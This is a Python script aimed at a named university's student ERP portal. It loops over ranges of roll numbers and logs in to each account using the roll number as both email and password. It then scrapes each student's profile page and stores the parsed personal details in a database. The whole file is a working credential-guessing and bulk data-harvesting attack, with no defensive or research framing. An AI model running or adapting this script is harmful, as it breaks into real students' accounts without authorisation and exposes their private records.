import requests
from list import LIST
from extract import extract
from database import insert

def profile(credential):
    response = requests.get('https://erp.mmumullana.org/login')

    HEADERS = {'Cookie': f"mmdu_erp_session={response.cookies.get('mmdu_erp_session')};"}
    form_data = {'role_id':3,'email':str(credential),'password':str(credential)}
    requests.post('https://erp.mmumullana.org/login/validate_login',data=form_data,headers=HEADERS)

    response = requests.get('https://erp.mmumullana.org/student/manage_profile',headers=HEADERS)
    return response.text

if __name__ == '__main__':
    for ITEM in LIST:
        for roll in range(ITEM['start'],ITEM['end']):
            string = profile(roll)

            if string == '':
                print(f'INCORRECT: {roll}')
                continue

            data_tuple = extract(string,roll,ITEM['batch'])
            if data_tuple is None:
                print(f'Error: {roll}')
                continue

            if insert(data_tuple):
                print(f'INSERTED: {roll}')
            else:
                print(f'Error: {roll}')